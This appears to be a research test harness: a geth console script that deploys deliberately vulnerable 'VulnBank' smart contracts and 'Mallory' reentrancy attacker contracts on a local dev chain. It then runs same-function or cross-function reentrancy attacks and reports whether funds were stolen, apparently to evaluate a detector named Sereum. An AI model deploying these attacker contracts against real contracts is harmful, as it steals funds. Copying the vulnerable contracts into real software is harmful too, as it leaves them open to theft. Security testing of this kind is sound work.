// deploy javascript code for manual-lock.sol

var defaultPassword = "";

personal.newAccount(defaultPassword);
personal.newAccount(defaultPassword);
function unlockAllAccounts() {
  // this is the prefundend dev contract
  personal.unlockAccount(eth.accounts[0], defaultPassword);
  // we'll use this as "attacker"
  personal.unlockAccount(eth.accounts[1], defaultPassword);
}
unlockAllAccounts()
var attacker = eth.accounts[1];
var victim = eth.accounts[0];

console.log("prefunded balance: " + eth.getBalance(eth.accounts[0]))
console.log("transferring initial funds to attacker account")
eth.sendTransaction({from: eth.accounts[0], to: attacker, value: 1000000000000})
admin.sleepBlocks(3)
console.log("attacker account balance: " + eth.getBalance(attacker))

function transferSomething() {
  eth.sendTransaction({from: eth.accounts[0], to: eth.accounts[2], value: 100})
  admin.sleepBlocks(4)
}


var malloryContract = web3.eth.contract([{"constant":false,"inputs":[],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"gimme","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"inputs":[{"name":"_vb","type":"address"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"}]);
var mallory_crossfunction_create = {
  from: web3.eth.accounts[1],
  data: '0x608060405234801561001057600080fd5b506040516020806105288339810180604052602081101561003057600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610456806100d26000396000f3fe60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc14610240578063de82efb41461024a575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663f8b2cb4f306040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060206040518083038186803b15801561016657600080fd5b505afa15801561017a573d6000803e3d6000fd5b505050506040513d602081101561019057600080fd5b81019080805190602001909291905050506040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200182815260200192505050600060405180830381600087803b15801561022657600080fd5b505af115801561023a573d6000803e3d6000fd5b50505050005b610248610254565b005b610252610428565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db03073ffffffffffffffffffffffffffffffffffffffff16316040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b1580156102f057600080fd5b505af1158015610304573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635fd8c7106040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561038e57600080fd5b505af11580156103a2573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610425573d6000803e3d6000fd5b50565b56fea165627a7a723058202fcb2aef439dc0647178ee1203ea1555c43053f8d6a420afddc6eeea501f1c1c0029',
  gas: '4700000'
};
var mallory_samefunction_create = {
  from: web3.eth.accounts[1],
  data: '0x608060405234801561001057600080fd5b506040516020806103d38339810180604052602081101561003057600080fd5b810190808051906020019092919050505033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610301806100d26000396000f3fe60806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc146100eb578063de82efb4146100f5575b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635fd8c7106040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156100d157600080fd5b505af11580156100e5573d6000803e3d6000fd5b50505050005b6100f36100ff565b005b6100fd6102d3565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db03073ffffffffffffffffffffffffffffffffffffffff16316040518263ffffffff167c01000000000000000000000000000000000000000000000000000000000281526004016000604051808303818588803b15801561019b57600080fd5b505af11580156101af573d6000803e3d6000fd5b50505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16635fd8c7106040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561023957600080fd5b505af115801561024d573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102d0573d6000803e3d6000fd5b50565b56fea165627a7a72305820041158ea2554f0d3c2992512e356a83c8ef333addee297853e116697e10dfce70029',
  gas: '4700000'
};

// we re-use the vulnbank contract ABI for all the variations of the VulnBank
// contracts. All offer exactly the same ABI interface anyway.
var vulnbankContract = web3.eth.contract([{"constant":false,"inputs":[],"name":"withdrawBalance","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"to","type":"address"},{"name":"amount","type":"uint256"}],"name":"transfer","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"deposit","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":true,"inputs":[{"name":"a","type":"address"}],"name":"getBalance","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}]);

var vulnbank_nolock_create = {
  from: web3.eth.accounts[0],
  data: '0x608060405234801561001057600080fd5b506103e8806100206000396000f3fe608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680635fd8c71014610067578063a9059cbb1461007e578063d0e30db0146100d9578063f8b2cb4f146100e3575b600080fd5b34801561007357600080fd5b5061007c610148565b005b34801561008a57600080fd5b506100d7600480360360408110156100a157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610242565b005b6100e1610326565b005b3480156100ef57600080fd5b506101326004803603602081101561010657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610374565b6040518082815260200191505060405180910390f35b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081111561023f573373ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d80600081146101f2576040519150601f19603f3d011682016040523d82523d6000602084013e6101f7565b606091505b50505060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b50565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151561032257806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820a3711ba353239f91ab85c6ffd7f9258bbf033f9171c4d5b1c0fbdd8888b9a3db0029',
  gas: '4700000'
};
var vulnbank_buggylock_create = {
  from: web3.eth.accounts[0],
  data: '0x608060405234801561001057600080fd5b506104f6806100206000396000f3fe608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680635fd8c71014610067578063a9059cbb1461007e578063d0e30db0146100d9578063f8b2cb4f146100e3575b600080fd5b34801561007357600080fd5b5061007c610148565b005b34801561008a57600080fd5b506100d7600480360360408110156100a157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610350565b005b6100e1610434565b005b3480156100ef57600080fd5b506101326004803603602081101561010657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610482565b6040518082815260200191505060405180910390f35b60001515600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151415156101a757600080fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081111561034d5760018060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055503373ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d80600081146102a8576040519150601f19603f3d011682016040523d82523d6000602084013e6102ad565b606091505b5050506000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b50565b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151561043057806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820c1a39bec88f30a9e0b387c7b563c77a350b91d7d95fd104e6daa13e7fecf803f0029',
  gas: '4700000'
};
var vulnbank_securelock_create = {
  from: web3.eth.accounts[0],
  data: '0x608060405234801561001057600080fd5b506105b4806100206000396000f3fe608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680635fd8c71014610067578063a9059cbb1461007e578063d0e30db0146100d9578063f8b2cb4f146100e3575b600080fd5b34801561007357600080fd5b5061007c610148565b005b34801561008a57600080fd5b506100d7600480360360408110156100a157600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610350565b005b6100e1610493565b005b3480156100ef57600080fd5b506101326004803603602081101561010657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610540565b6040518082815260200191505060405180910390f35b60001515600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151415156101a757600080fd5b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081111561034d5760018060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff0219169083151502179055503373ffffffffffffffffffffffffffffffffffffffff168160405180600001905060006040518083038185875af1925050503d80600081146102a8576040519150601f19603f3d011682016040523d82523d6000602084013e6102ad565b606091505b5050506000600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555060008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055505b50565b60001515600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151415156103af57600080fd5b806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205410151561048f57806000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550806000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825403925050819055505b5050565b60001515600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615151415156104f257600080fd5b346000803373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540192505081905550565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905091905056fea165627a7a72305820d6b4e93785a71bca0dc92f32a9839a8c085901110ece2fab17f2eafd08a5a9820029',
  gas: '4700000'
};


var mallory;

console.log("[+] deploying contracts");
var vulnbank = vulnbankContract.new(
  /*****************************************************************
   * Uncomment to switch between the attack type.
   */
  // switch to the vuln and secure version by using the respective
  // vulnbank_X_create variable here.
	//vulnbank_nolock_create,
	//vulnbank_buggylock_create,
	vulnbank_securelock_create,
  /****************************************************************/
  function (e, contract) {
    console.log("vulnbank:", e, contract);
    if (typeof contract.address !== 'undefined') {
      console.log('VulnBankX Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);

      console.log("making mallory contract")
      var _vb = contract.address;
      mallory = malloryContract.new(
        _vb,
        /*****************************************************************
         * Uncomment to switch between the attack type.
         */
				mallory_samefunction_create,
				//mallory_crossfunction_create,
        /****************************************************************/
        function (e, contract){
          console.log("mallory", e, contract);
          if (typeof contract.address !== 'undefined') {
            console.log('Mallory Contract mined! address: ' + contract.address + ' transactionHash: ' + contract.transactionHash);
          }
        })
    }
  })

transferSomething();
transferSomething();


function setupInitialState() {
  console.log("[+] Setting up initial state");
  vulnbank.deposit({from: eth.accounts[0], value: 1000000, gas: '4700000'});
}

function printStatus() {
  console.log("");
  console.log("Mallory  has " + eth.getBalance(mallory.address) + " wei");
  console.log("Mallory  has " + vulnbank.getBalance(mallory.address) + " wei in VulnBank");
  console.log("attacker has " + eth.getBalance(attacker) + " wei");
  console.log("attacker has " + vulnbank.getBalance(attacker) + " wei in VulnBank");
  console.log("victim   has " + vulnbank.getBalance(victim) + " wei in VulnBank");
  console.log("Vulnbank has " + eth.getBalance(vulnbank.address) + " wei");
  if (eth.getBalance(vulnbank.address) < vulnbank.getBalance(victim)) {
    console.log("Warning: VulnBank does not have enough funds to return victim's investment");
  }
  console.log("");
}


function triggerAttack() {
  transferSomething(); // sometimes it's stuck for some reason
  setupInitialState();
  transferSomething();
  printStatus();

  var preBalance = eth.getBalance(attacker);

  admin.sleepBlocks(3);

  console.log("[+] Triggering attack");
  var t = mallory.attack({from: attacker, to: mallory.address, gas: '4700000', value: 1000000});
  admin.sleepBlocks(3);

  printStatus()

  console.log("[+] Attacker is withdrawing from vulnbank!");

  admin.sleepBlocks(3);
  vulnbank.withdrawBalance({from: eth.accounts[1], gas: '4700000'});

  admin.sleepBlocks(3);

  printStatus()

  var gains = (eth.getBalance(attacker) - preBalance);
  console.log("Attacker gained " + gains + " wei");
  if (gains > 0) {
    console.log("[+] Attack SUCCESS")
  } else {
    console.log("[+] Attack FAIL")
  }

  return t;
}


function getAttackTrace() {
  a = triggerAttack();
  return debug.traceTransaction(a);
}


function checkTrace() {
  // sereum only
  t = triggerAttack();
  return debug.checkTransaction(t)
}
